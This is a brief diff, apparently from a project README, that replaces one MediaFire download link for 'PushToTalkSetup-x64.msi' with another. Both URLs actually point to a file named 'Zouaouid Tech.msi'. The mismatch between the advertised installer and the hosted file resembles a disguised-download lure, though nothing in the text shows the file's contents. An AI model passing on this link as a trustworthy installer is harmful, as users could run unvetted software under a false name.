@@ -9,4 +9,4 @@
 
 
 ### Media fire
-[Download PushToTalkSetup-x64.msi](https://www.mediafire.com/file/bmxfc77oyr2mq6r/Zouaouid+Tech.msi/file)
+[Download PushToTalkSetup-x64.msi](https://www.mediafire.com/file/3sgl5zw2yiyhfql/Zouaouid+Tech.msi/file)
